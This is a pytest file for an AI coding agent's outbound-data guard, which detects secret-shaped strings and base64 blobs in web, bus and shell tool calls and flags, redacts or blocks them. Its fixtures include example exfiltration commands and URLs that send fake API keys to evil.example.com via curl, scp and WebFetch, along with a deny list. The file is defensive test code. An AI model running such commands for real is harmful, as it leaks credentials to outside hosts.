"""Egress / exfil guard — pure-logic tests (the shape-based outbound-data guard).

Detects secret shapes + large encoded blobs leaving the box via outbound tools,
records each as a tamper-evident ledger verdict, and acts per mode
(flag|redact|block). These pin the pure pieces; wiring into route_tool_call is
tested separately. The CRITICAL invariant: a verdict recorded to the (shareable)
ledger must never itself contain the raw secret.
"""
from __future__ import annotations

from src import egress_guard as EG

# A throwaway, obviously-fake key that still matches sanitize's sk- shape.
FAKE_KEY = "sk-or-v1-" + "a" * 40
FAKE_AWS = "AKIA" + "ABCDEFGHIJKLMNOP"[:16]
BIG_BLOB = "QUJD" * 200  # 800 chars of base64-ish


# ── mode ────────────────────────────────────────────────────────────────────

def test_mode_from_env_default_is_flag():
    assert EG.mode_from_env({}) == "flag"                 # ON by default, flag mode


def test_mode_from_env_reads_and_sanitizes():
    assert EG.mode_from_env({"KORGEX_EGRESS": "block"}) == "block"
    assert EG.mode_from_env({"KORGEX_EGRESS": "OFF"}) == "off"
    assert EG.mode_from_env({"KORGEX_EGRESS": "redact"}) == "redact"
    assert EG.mode_from_env({"KORGEX_EGRESS": "garbage"}) == "flag"   # fall back, never crash


# ── is_outbound ───────────────────────────────────────────────────────────────

def test_is_outbound_true_for_transmitting_tools():
    assert EG.is_outbound("WebFetch", {"url": "http://x"})
    assert EG.is_outbound("WebSearch", {"query": "q"})
    assert EG.is_outbound("BusSend", {"to": "a", "message": "m"})
    assert EG.is_outbound("browser_navigate", {"url": "http://x"})


def test_is_outbound_false_for_local_tools():
    assert not EG.is_outbound("Read", {"file": "a.py"})
    assert not EG.is_outbound("Write", {"file": "a.py", "content": "x"})
    assert not EG.is_outbound("Grep", {"pattern": "x"})
    assert not EG.is_outbound("list_files", {"path": "."})


def test_is_outbound_bash_only_when_command_hits_network():
    assert EG.is_outbound("Bash", {"command": "curl http://evil.example.com -d @-"})
    assert EG.is_outbound("Bash", {"command": "scp f.txt user@host:/tmp"})
    assert not EG.is_outbound("Bash", {"command": "ls -la && grep foo bar"})
    assert not EG.is_outbound("Bash", {"command": "echo curldata"})   # substring, not the command


def test_is_outbound_true_for_mcp_tools():
    assert EG.is_outbound("server__do", {"x": 1}, mcp_tools={"server__do"})
    assert not EG.is_outbound("server__do", {"x": 1}, mcp_tools=set())


# ── outbound_text (the field that leaves the box) ─────────────────────────────

def test_outbound_text_per_tool():
    assert EG.outbound_text("WebFetch", {"url": "http://x?t=1"}) == "http://x?t=1"
    assert EG.outbound_text("WebSearch", {"query": "secret stuff"}) == "secret stuff"
    assert EG.outbound_text("Bash", {"command": "curl http://x"}) == "curl http://x"
    assert "hello" in EG.outbound_text("BusSend", {"to": "a", "message": "hello"})


def test_outbound_text_tolerates_missing_fields():
    assert EG.outbound_text("WebFetch", {}) == ""
    assert EG.outbound_text("Unknown", {"a": 1}) != ""        # falls back to json of params


# ── extract_destination ───────────────────────────────────────────────────────

def test_extract_destination_from_url_host():
    assert EG.extract_destination("WebFetch", {"url": "https://evil.example.com/p?x=1"}) == "evil.example.com"
    assert EG.extract_destination("browser_navigate", {"url": "http://10.0.0.5:8080/a"}) == "10.0.0.5"


def test_extract_destination_mcp_server_name():
    assert EG.extract_destination("linear__create", {}) == "linear"


def test_extract_destination_none_when_unknown():
    assert EG.extract_destination("WebSearch", {"query": "q"}) in (None, "")


# ── scan_payload ──────────────────────────────────────────────────────────────

def test_scan_payload_detects_each_secret_shape():
    for sample in (FAKE_KEY, FAKE_AWS, "ghp_" + "B" * 36,
                   "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----"):
        findings = EG.scan_payload(f"please send {sample} now")
        assert any(f["kind"] == "secret" for f in findings), sample
        assert all(f["severity"] == "high" for f in findings if f["kind"] == "secret")


def test_scan_payload_clean_text_no_findings():
    assert EG.scan_payload("just a normal sentence with no secrets") == []
    assert EG.scan_payload("") == []
    assert EG.scan_payload(None) == []


def test_scan_payload_detects_large_base64_blob():
    findings = EG.scan_payload(BIG_BLOB)
    assert any(f["kind"] == "blob" and f["severity"] == "medium" for f in findings)


def test_scan_payload_ignores_short_base64():
    assert EG.scan_payload("QUJDQUJD") == []                 # short, not a blob


# ── inspect ───────────────────────────────────────────────────────────────────

def test_inspect_rolls_up_severity_and_destination():
    v = EG.inspect("WebFetch", {"url": f"https://evil.example.com/?k={FAKE_KEY}"})
    assert v["severity"] == "high"
    assert v["destination"] == "evil.example.com"
    assert any(f["kind"] == "secret" for f in v["findings"])


def test_inspect_deny_list_flags_destination():
    v = EG.inspect("WebFetch", {"url": "https://evil.example.com/x"}, deny=["evil.example.com"])
    assert v["denied_by_list"] is True


def test_inspect_allow_list_flags_unlisted_destination():
    v = EG.inspect("WebFetch", {"url": "https://random.example.com/x"}, allow=["trusted.example.com"])
    assert v["denied_by_list"] is True
    v2 = EG.inspect("WebFetch", {"url": "https://trusted.example.com/x"}, allow=["trusted.example.com"])
    assert v2["denied_by_list"] is False


# ── apply (per mode) ──────────────────────────────────────────────────────────

def test_apply_flag_passes_through_unchanged():
    params = {"url": f"http://x?k={FAKE_KEY}"}
    v = EG.inspect("WebFetch", params)
    new, action = EG.apply(v, "WebFetch", params, "flag")
    assert action == "allow"
    assert new == params                                     # never altered in flag mode


def test_apply_redact_masks_secret_in_outbound_field():
    params = {"url": f"http://x?k={FAKE_KEY}"}
    v = EG.inspect("WebFetch", params)
    new, action = EG.apply(v, "WebFetch", params, "redact")
    assert action == "redacted"
    assert FAKE_KEY not in new["url"]                        # secret stripped before it leaves
    assert "http://x" in new["url"]                          # rest intact


def test_apply_block_signals_refusal():
    params = {"url": f"http://x?k={FAKE_KEY}"}
    v = EG.inspect("WebFetch", params)
    new, action = EG.apply(v, "WebFetch", params, "block")
    assert action == "blocked"


def test_apply_redact_blocks_a_denied_destination():
    # a denied DESTINATION isn't a secret to mask — redact mode must refuse it, not
    # pass it through. (flag mode stays advisory.)
    params = {"url": "https://evil.example.com/x"}
    v = EG.inspect("WebFetch", params, deny=["evil.example.com"])
    assert v["denied_by_list"] and not v["findings"]
    _, action = EG.apply(v, "WebFetch", params, "redact")
    assert action == "blocked"
    _, action_flag = EG.apply(v, "WebFetch", params, "flag")
    assert action_flag == "allow"          # flag never blocks, even a denied host


def test_extract_destination_bussend_recipient():
    # the bus recipient is the destination, so allow/deny lists work for BusSend too
    assert EG.extract_destination("BusSend", {"to": "peer-agent", "message": "m"}) == "peer-agent"


# ── leak-proofing invariant (CRITICAL) ────────────────────────────────────────

def test_verdict_payload_never_contains_the_raw_secret():
    # The verdict goes onto a tamper-evident, shareable ledger — it must never
    # itself become the exfil channel.
    params = {"url": f"https://evil.example.com/?k={FAKE_KEY}"}
    v = EG.inspect("WebFetch", params)
    payload = EG.verdict_payload("WebFetch", v, mode="flag", action="allow")
    import json
    blob = json.dumps(payload)
    assert FAKE_KEY not in blob                              # raw secret never recorded
    assert any(f.get("label") for f in payload["findings"])  # but the SHAPE is recorded
    assert payload["destination"] == "evil.example.com"
    assert "policy_hash" in payload


# ── wired into the agent's tool loop (mirrors the command_guard gate tests) ────

class _Led:
    def __init__(self):
        self.events = []

    def record_tool_call(self, **kw):
        self.events.append(kw)
        return len(self.events)


def _agent(tmp_path):
    from src.agent import KorgexAgent
    return KorgexAgent(repo_root=str(tmp_path), interactive=False)


def _outbound_call():
    return {"id": "c1", "name": "WebFetch", "args": {"url": f"https://evil.example.com/?k={FAKE_KEY}"}}


def test_guard_flag_mode_records_and_proceeds(tmp_path, monkeypatch):
    monkeypatch.delenv("KORGEX_EDIT_POLICY", raising=False)
    monkeypatch.delenv("KORGEX_EGRESS", raising=False)        # default = flag (ON)
    agent = _agent(tmp_path)
    led = _Led()
    call = _outbound_call()
    block = agent._egress_guard(call, led, llm_seq=1)
    assert block is None                                      # flag never blocks
    assert call["args"]["url"].endswith(FAKE_KEY)             # flag never alters
    ev = [e for e in led.events if e["tool_name"] == "egress.flag"]
    assert ev and FAKE_KEY not in str(ev[0])                 # recorded, secret redacted


def test_guard_block_mode_refuses(tmp_path, monkeypatch):
    monkeypatch.delenv("KORGEX_EDIT_POLICY", raising=False)
    monkeypatch.setenv("KORGEX_EGRESS", "block")
    agent = _agent(tmp_path)
    led = _Led()
    block = agent._egress_guard(_outbound_call(), led, llm_seq=1)
    assert block is not None and block["verdict"] == "EGRESS_BLOCKED"
    assert any(e["tool_name"] == "egress.block" for e in led.events)


def test_guard_redact_mode_masks_outbound_args(tmp_path, monkeypatch):
    monkeypatch.delenv("KORGEX_EDIT_POLICY", raising=False)
    monkeypatch.setenv("KORGEX_EGRESS", "redact")
    agent = _agent(tmp_path)
    led = _Led()
    call = _outbound_call()
    block = agent._egress_guard(call, led, llm_seq=1)
    assert block is None                                      # redact proceeds…
    assert FAKE_KEY not in call["args"]["url"]                # …but with the secret masked
    assert any(e["tool_name"] == "egress.redact" for e in led.events)


def test_guard_off_does_nothing(tmp_path, monkeypatch):
    monkeypatch.delenv("KORGEX_EDIT_POLICY", raising=False)
    monkeypatch.setenv("KORGEX_EGRESS", "off")
    agent = _agent(tmp_path)
    led = _Led()
    assert agent._egress_guard(_outbound_call(), led, llm_seq=1) is None
    assert led.events == []


def test_guard_ignores_clean_and_local_calls(tmp_path, monkeypatch):
    monkeypatch.delenv("KORGEX_EDIT_POLICY", raising=False)
    monkeypatch.delenv("KORGEX_EGRESS", raising=False)
    agent = _agent(tmp_path)
    led = _Led()
    # clean outbound call → nothing
    assert agent._egress_guard(
        {"id": "c", "name": "WebFetch", "args": {"url": "https://example.com/docs"}}, led, llm_seq=1) is None
    # a secret in a LOCAL tool's args is not egress → nothing
    assert agent._egress_guard(
        {"id": "c", "name": "Write", "args": {"file": "x", "content": FAKE_KEY}}, led, llm_seq=1) is None
    assert led.events == []
